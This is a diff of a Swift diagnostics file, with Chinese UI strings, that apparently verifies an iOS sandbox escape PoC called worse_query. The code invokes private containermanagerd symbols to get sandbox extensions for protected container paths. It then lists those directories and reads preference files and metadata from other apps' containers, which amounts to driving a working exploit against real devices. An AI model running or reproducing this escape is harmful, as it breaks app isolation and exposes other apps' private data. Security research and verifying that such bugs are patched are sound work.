@@ -2,16 +2,80 @@
 //  Diagnostics.swift
 //  Staged, read-only verification of worse_query.
 //
-//  Stage 1 checks the App Group entitlement (the exploit's hard prerequisite).
-//  Stage 2 checks the private containermanagerd symbols.
-//  Stage 3 tries the escape against every path the PoC claims, with both flag
-//  sets, and measures the before/after sandbox differential.
-//  Stage 4 tries to read a real file from another app container.
+//  Produces a structured report so the UI can show a verdict, a stage
+//  checklist and per-path cards instead of a raw log.
 //
 
 import Foundation
 
 enum Diagnostics {
+
+    enum Status { case pass, fail, warn, info, skip }
+    enum Verdict { case pass, partial, fail, untestable }
+
+    struct Stage {
+        let title: String
+        let status: Status
+        let detail: String
+    }
+
+    struct ChildResult {
+        let name: String
+        let containerID: String
+        let metadataID: String
+        let readBytes: Int
+        let error: String
+    }
+
+    struct TargetResult {
+        let label: String
+        let path: String
+        let exists: Bool
+        let preListable: Bool
+        let preErrno: Int32
+        let handle: Int64
+        let postListable: Bool
+        let postErrno: Int32
+        let entryCount: Int
+        let children: [ChildResult]
+
+        var childReads: Int { children.filter { $0.readBytes > 0 }.count }
+
+        var status: Status {
+            if handle >= 0 && postListable { return .pass }
+            if handle >= 0 { return .warn }
+            if !exists && handle == -255 { return .skip }
+            return .fail
+        }
+
+        var summaryLine: String {
+            var parts: [String] = ["handle \(handle)"]
+            parts.append(preListable ? "消费前可读" : "消费前 EPERM")
+            if handle >= 0 {
+                parts.append(postListable ? "消费后 \(entryCount) 项" : "消费后拒绝")
+            }
+            if childReads > 0 { parts.append("子读取 \(childReads)") }
+            return parts.joined(separator: " · ")
+        }
+    }
+
+    struct Report {
+        let verdict: Verdict
+        let headline: String
+        let subheadline: String
+        let iosVersion: String
+        let device: String
+        let stages: [Stage]
+        let targets: [TargetResult]
+        let handles: Int
+        let listings: Int
+        let deepReads: Int
+        let preDenied: Int
+        let symbolReport: String
+        let groupIdentifier: String
+        let groupPath: String
+        let rawLog: String
+    }
 
     struct Target {
         let label: String
@@ -20,170 +84,267 @@ enum Diagnostics {
     }
 
     private static let targets: [Target] = [
-        Target(label: "AppGroup root",
+        Target(label: "AppGroup 根目录",
                path: "/private/var/mobile/Containers/Shared/AppGroup", deep: true),
-        Target(label: "App containers",
+        Target(label: "App 数据容器",
                path: "/private/var/mobile/Containers/Data/Application", deep: true),
-        Target(label: "InternalDaemon containers",
+        Target(label: "InternalDaemon 容器",
                path: "/private/var/mobile/Containers/Data/InternalDaemon", deep: true),
-        Target(label: "PluginKitPlugin containers",
+        Target(label: "PluginKitPlugin 容器",
                path: "/private/var/mobile/Containers/Data/PluginKitPlugin", deep: true),
         Target(label: "SystemGroup (iOS 27)",
                path: "/private/var/containers/Shared/SystemGroup", deep: true),
-        Target(label: "System data (iOS 27)",
+        Target(label: "System 数据 (iOS 27)",
                path: "/private/var/containers/Data/System", deep: false),
     ]
 
-    static func run(group: String) -> String {
-        var lines: [String] = []
-        let log: (String) -> Void = { lines.append($0) }
+    static func run(group: String) -> Report {
+        var raw: [String] = []
+        let emit: (String) -> Void = { raw.append($0) }
 
         let v = ProcessInfo.processInfo.operatingSystemVersion
         let version = "\(v.majorVersion).\(v.minorVersion).\(v.patchVersion)"
-        let build = Bundle.main.infoDictionary?["CFBundleVersion"] as? String ?? "?"
+        let device = deviceModel()
 
-        log("worse_query verification harness")
-        log("iOS \(version) | \(deviceModel())")
-        log("app \(Bundle.main.bundleIdentifier ?? "?") (\(build))")
-        log("date \(ISO8601DateFormatter().string(from: Date()))")
-        log("")
+        emit("worse_query verification harness")
+        emit("iOS \(version) | \(device)")
+        emit("")
+
+        var stages: [Stage] = []
 
         // MARK: Stage 1 - App Group entitlement
-        log("== Stage 1: App Group entitlement ==")
-        guard !group.isEmpty else {
-            log("[FAIL] WQAppGroup is empty in Info.plist")
-            log("")
-            log("VERDICT: FAIL (build misconfigured)")
-            return lines.joined(separator: "\n")
-        }
-        log("[INFO] group identifier: \(group)")
-
+        emit("== Stage 1: App Group entitlement ==")
         let fm = FileManager.default
-        guard let groupURL = fm.containerURL(forSecurityApplicationGroupIdentifier: group) else {
-            log("[FAIL] containerURL(forSecurityApplicationGroupIdentifier:) returned nil")
-            log("       The com.apple.security.application-groups entitlement is missing,")
-            log("       or this group is not included in the signing profile.")
-            log("       The exploit cannot even reach containermanagerd in this state.")
-            log("")
-            log("VERDICT: FAIL (not testable: App Group entitlement missing)")
-            return lines.joined(separator: "\n")
+        var groupPath = ""
+        var groupOK = false
+
+        if group.isEmpty {
+            emit("[FAIL] WQAppGroup is empty in Info.plist")
+            stages.append(Stage(title: "App Group entitlement",
+                                status: .fail,
+                                detail: "Info.plist 中 WQAppGroup 为空"))
+        } else if let url = fm.containerURL(forSecurityApplicationGroupIdentifier: group) {
+            groupOK = true
+            groupPath = url.path
+            emit("[PASS] group container: \(url.path)")
+            stages.append(Stage(title: "App Group entitlement",
+                                status: .pass,
+                                detail: group))
+            try? fm.createDirectory(at: url.appendingPathComponent("Library"),
+                                    withIntermediateDirectories: true)
+        } else {
+            emit("[FAIL] containerURL(forSecurityApplicationGroupIdentifier:) == nil")
+            stages.append(Stage(title: "App Group entitlement",
+                                status: .fail,
+                                detail: "entitlement 缺失，或 group 不在 signing profile 中"))
         }
-        log("[PASS] group container: \(groupURL.path)")
-        try? fm.createDirectory(at: groupURL.appendingPathComponent("Library"),
-                                withIntermediateDirectories: true)
+        emit("")
+
+        guard groupOK else {
+            return Report(verdict: .untestable,
+                          headline: "无法验证",
+                          subheadline: "App Group entitlement 没生效，PoC 连入口都没有",
+                          iosVersion: version,
+                          device: device,
+                          stages: stages,
+                          targets: [],
+                          handles: 0,
+                          listings: 0,
+                          deepReads: 0,
+                          preDenied: 0,
+                          symbolReport: "not checked",
+                          groupIdentifier: group,
+                          groupPath: "",
+                          rawLog: raw.joined(separator: "\n"))
+        }
 
         // MARK: Stage 2 - private symbols
-        log("")
-        log("== Stage 2: private containermanagerd symbols ==")
-        let symbolReport = wq_diag_symbol_report()
-        if symbolReport.hasPrefix("OK") {
-            log("[PASS] \(symbolReport)")
-        } else {
-            log("[FAIL] \(symbolReport)")
+        emit("== Stage 2: private containermanagerd symbols ==")
+        let symbolReport: String = wq_diag_symbol_report() ?? "FAIL: nil"
+        let symbolsOK = symbolReport.hasPrefix("OK")
+        emit(symbolsOK ? "[PASS] \(symbolReport)" : "[FAIL] \(symbolReport)")
+        stages.append(Stage(title: "containermanagerd 私有符号",
+                            status: symbolsOK ? .pass : .fail,
+                            detail: symbolReport))
+        emit("")
+
+        guard symbolsOK else {
+            return Report(verdict: .fail,
+                          headline: "无法调用私有接口",
+                          subheadline: "containermanagerd 的符号缺失，系统可能改了实现",
+                          iosVersion: version,
+                          device: device,
+                          stages: stages,
+                          targets: [],
+                          handles: 0,
+                          listings: 0,
+                          deepReads: 0,
+                          preDenied: 0,
+                          symbolReport: symbolReport,
+                          groupIdentifier: group,
+                          groupPath: groupPath,
+                          rawLog: raw.joined(separator: "\n"))
         }
 
         // MARK: Stage 3 - per-target escape
-        log("")
-        log("== Stage 3: sandbox extension per target ==")
+        emit("== Stage 3: sandbox extension per target ==")
+        var results: [TargetResult] = []
         var handles = 0
         var listings = 0
         var deepReads = 0
         var preDenied = 0
 
         for (i, target) in targets.enumerated() {
-            log("")
-            log("[\(i + 1)/\(targets.count)] \(target.label)")
-            log("    \(target.path)")
+            emit("")
+            emit("[\(i + 1)/\(targets.count)] \(target.label)")
+            emit("    \(target.path)")
 
             var st = stat()
-            let lst = lstat(target.path, &st)
+            let exists = lstat(target.path, &st) == 0
             let lstErr = errno
-            log("    lstat: \(lst == 0 ? "ok" : "fail errno=\(lstErr)")")
+            let lstText = exists ? "ok" : "fail errno=\(lstErr)"
+            emit("    lstat: \(lstText)")
 
             var preErr: Int32 = 0
             let pre = wq_listdir(target.path, &preErr, 8)
-            if pre == nil && (preErr == EPERM || preErr == EACCES) { preDenied += 1 }
-            log("    before extension: \(pre != nil ? "listable (\(pre!.count)+ entries)" : "denied errno=\(preErr)")")
+            let preListable = pre != nil
+            if !preListable && (preErr == EPERM || preErr == EACCES) { preDenied += 1 }
+            let preText = preListable ? "listable (\(pre?.count ?? 0)+)" : "denied errno=\(preErr)"
+            emit("    before: \(preText)")
 
             var handle = worse_query(target.path, group, false, false)
-            log("    worse_query(alt=false, create_dir=false) -> \(handle) \(code(handle))")
+            emit("    worse_query(false,false) -> \(handle) \(code(handle))")
 
             if handle == -255 {
                 handle = worse_query(target.path, group, false, true)
-                log("    worse_query(alt=false, create_dir=true)  -> \(handle) \(code(handle))")
+                emit("    worse_query(false,true)  -> \(handle) \(code(handle))")
             }
             if handle < 0 {
                 let alt = worse_query(target.path, group, true, false)
-                log("    worse_query(alt=true,  create_dir=false) -> \(alt) \(code(alt))")
+                emit("    worse_query(true,false)  -> \(alt) \(code(alt))")
                 if alt >= 0 { handle = alt }
             }
 
-            if handle < 0 {
-                log("    [FAIL] no extension for this target")
-                continue
-            }
-            handles += 1
-
+            var post: [String]?
             var postErr: Int32 = 0
-            let post = wq_listdir(target.path, &postErr, 16)
-            if let post = post {
-                listings += 1
-                log("    [PASS] after extension: listable, \(post.count) entries")
-                log("    sample: \(post.prefix(8).joined(separator: ", "))")
-                if target.deep {
-                    deepReads += deepProbe(root: target.path,
-                                           children: Array(post.prefix(2)),
-                                           group: group,
-                                           log: log)
+            var children: [ChildResult] = []
+
+            if handle >= 0 {
+                handles += 1
+                post = wq_listdir(target.path, &postErr, 16)
+                if let post = post {
+                    emit("    [PASS] after: listable, \(post.count) entries")
+                    emit("    sample: \(post.prefix(8).joined(separator: ", "))")
+                } else {
+                    emit("    [WARN] after: denied errno=\(postErr)")
                 }
+
+                if target.deep, let post = post {
+                    let probe = deepProbe(root: target.path,
+                                          children: Array(post.prefix(2)),
+                                          group: group,
+                                          emit: emit)
+                    deepReads += probe.reads
+                    children = probe.children
+                }
+
+                worse_query_release(handle)
+                emit("    released \(handle)")
             } else {
-                log("    [WARN] extension granted but listing denied errno=\(postErr)")
+                emit("    [FAIL] no extension")
             }
 
-            worse_query_release(handle)
-            log("    released handle \(handle)")
+            if post != nil { listings += 1 }
+
+            results.append(TargetResult(label: target.label,
+                                        path: target.path,
+                                        exists: exists,
+                                        preListable: preListable,
+                                        preErrno: preErr,
+                                        handle: handle,
+                                        postListable: post != nil,
+                                        postErrno: postErr,
+                                        entryCount: post?.count ?? 0,
+                                        children: children))
         }
+
+        // MARK: Stage 3/4 summary
+        let stage3Status: Status
+        if handles > 0 && listings > 0 {
+            stage3Status = .pass
+        } else if handles > 0 {
+            stage3Status = .warn
+        } else {
+            stage3Status = .fail
+        }
+        stages.append(Stage(title: "目标路径逃逸",
+                            status: stage3Status,
+                            detail: "\(handles)/\(targets.count) 个目标拿到 extension，\(listings) 个目录可读"))
+
+        let stage4Status: Status = deepReads > 0 ? .pass : (handles > 0 ? .warn : .skip)
+        stages.append(Stage(title: "跨容器真实读取",
+                            status: stage4Status,
+                            detail: deepReads > 0
+                                ? "\(deepReads) 个其他 App 容器的文件读取成功"
+                                : "没有跨容器文件读取成功"))
 
         // MARK: Verdict
-        log("")
-        log("== VERDICT ==")
-        log("extension handles granted: \(handles)/\(targets.count)")
-        log("post-extension directory listings: \(listings)")
-        log("cross-container child reads: \(deepReads)")
-        log("targets denied before extension: \(preDenied)")
+        let verdict: Verdict
+        let headline: String
+        let subheadline: String
 
-        if handles > 0 && (deepReads > 0 || listings > 0) {
-            log("RESULT: PASS - the sandbox escape works on iOS \(version).")
-            if preDenied > 0 && listings > 0 {
-                log("PROOF: \(preDenied) path(s) denied before consuming became readable after.")
-            }
+        if handles > 0 && (listings > 0 || deepReads > 0) {
+            verdict = .pass
+            headline = "沙盒逃逸生效"
+            subheadline = "拿到 \(handles) 个 extension，\(listings) 个目录可读，\(deepReads) 个跨容器文件可读"
         } else if handles > 0 {
-            log("RESULT: PARTIAL - containermanagerd issued a token, but nothing was readable.")
+            verdict = .partial
+            headline = "逃逸部分生效"
+            subheadline = "extension 签发成功，但目录/文件读不到"
         } else {
-            log("RESULT: FAIL - no extension was issued.")
-            log("        Either the bug is fixed on this build, the query flags/class changed,")
-            log("        or the App Group is not provisioned correctly.")
+            verdict = .fail
+            headline = "沙盒逃逸未生效"
+            subheadline = "\(targets.count) 个目标全部没拿到 extension；可能已修复或 flags 不对"
         }
-        log("")
-        log("[NOTE] This harness is read-only. It only writes inside its own App Group.")
-        return lines.joined(separator: "\n")
+
+        emit("")
+        emit("== VERDICT ==")
+        emit("\(headline) - \(subheadline)")
+        emit("handles \(handles)/\(targets.count), listings \(listings), deep reads \(deepReads), pre-denied \(preDenied)")
+        emit("[NOTE] read-only; only writes inside its own App Group")
+
+        return Report(verdict: verdict,
+                      headline: headline,
+                      subheadline: subheadline,
+                      iosVersion: version,
+                      device: device,
+                      stages: stages,
+                      targets: results,
+                      handles: handles,
+                      listings: listings,
+                      deepReads: deepReads,
+                      preDenied: preDenied,
+                      symbolReport: symbolReport,
+                      groupIdentifier: group,
+                      groupPath: groupPath,
+                      rawLog: raw.joined(separator: "\n"))
     }
 
     /// Consumes a per-container extension, then tries to read real container data.
-    /// Mirrors what the original PoC does when it enumerates AppGroup children.
     private static func deepProbe(root: String,
                                   children: [String],
                                   group: String,
-                                  log: (String) -> Void) -> Int {
+                                  emit: (String) -> Void) -> (reads: Int, children: [ChildResult]) {
         var reads = 0
+        var out: [ChildResult] = []
 
         for child in children {
             let childPath = root + "/" + child
-
-            // create_dir=true bypasses the lstat gate inside worse_query().
             let h = worse_query(childPath, group, false, true)
             if h < 0 {
-                log("      child \(child): per-container extension failed \(h) \(code(h))")
+                emit("      child \(child): extension failed \(h) \(code(h))")
+                out.append(ChildResult(name: child, containerID: "?", metadataID: "?",
+                                       readBytes: 0, error: "ext \(h)"))
                 continue
             }
 
@@ -191,6 +352,8 @@ enum Diagnostics {
             let meta = wq_container_metadata(childPath)
             let mid = (meta?["MCMMetadataIdentifier"] as? String) ?? "?"
 
+            var readBytes = 0
+            var errText = ""
             var prefErr: Int32 = 0
             let prefs = wq_listdir(childPath + "/Library/Preferences", &prefErr, 8)
 
@@ -198,23 +361,24 @@ enum Diagnostics {
                 var readErr: Int32 = 0
                 if let data = wq_readfile(childPath + "/Library/Preferences/" + first,
                                           4096, &readErr) {
-                    reads += 1
-                    log("      child \(child): ext=ok id=\(cid) meta=\(mid) " +
-                        "prefs=\(prefs.count) read=\(data.count)B")
+                    readBytes = data.count
+                    emit("      child \(child): ext=ok id=\(cid) meta=\(mid) read=\(readBytes)B")
                 } else {
-                    log("      child \(child): ext=ok id=\(cid) meta=\(mid) " +
-                        "prefs=\(prefs.count) read errno=\(readErr)")
+                    errText = "read errno \(readErr)"
+                    emit("      child \(child): ext=ok id=\(cid) meta=\(mid) \(errText)")
                 }
             } else {
-                var listErr: Int32 = 0
-                let top = wq_listdir(childPath, &listErr, 8)
-                log("      child \(child): ext=ok id=\(cid) meta=\(mid) " +
-                    "prefs errno=\(prefErr) top=\(top?.count ?? -1)")
+                errText = "prefs errno \(prefErr)"
+                emit("      child \(child): ext=ok id=\(cid) meta=\(mid) \(errText)")
             }
 
+            if readBytes > 0 { reads += 1 }
+            out.append(ChildResult(name: child, containerID: cid, metadataID: mid,
+                                   readBytes: readBytes, error: errText))
             worse_query_release(h)
         }
-        return reads
+
+        return (reads, out)
     }
 
     private static func code(_ h: Int64) -> String {
@@ -236,5 +400,43 @@ enum Diagnostics {
         return withUnsafePointer(to: &uts.machine) {
             $0.withMemoryRebound(to: CChar.self, capacity: 1) { String(cString: $0) }
         }
+    }
+}
+
+extension Diagnostics.Status {
+    var text: String {
+        switch self {
+        case .pass: return "PASS"
+        case .fail: return "FAIL"
+        case .warn: return "WARN"
+        case .info: return "INFO"
+        case .skip: return "SKIP"
+        }
+    }
+}
+
+extension Diagnostics.TargetResult {
+    var statusWord: String { status.text }
+}
+
+extension Diagnostics.Report {
+    var shareText: String {
+        var s = "worse_query 验证结论\n"
+        s += "\(headline)\n"
+        s += "\(subheadline)\n"
+        s += "iOS \(iosVersion) | \(device)\n"
+        s += "App Group: \(groupIdentifier)\n"
+        s += "extension \(handles)/\(targets.count) | 目录可读 \(listings) | 跨容器读取 \(deepReads)\n\n"
+
+        for t in targets {
+            let pre = t.preListable ? "可读" : "EPERM(\(t.preErrno))"
+            let post = t.postListable ? "\(t.entryCount)项" : "拒绝(\(t.postErrno))"
+            s += "[\(t.statusWord)] \(t.label)\n"
+            s += "  \(t.path)\n"
+            s += "  handle=\(t.handle) 消费前=\(pre) 消费后=\(post) 子读取=\(t.childReads)\n"
+        }
+
+        s += "\n--- 原始日志 ---\n\(rawLog)\n"
+        return s
     }
 }
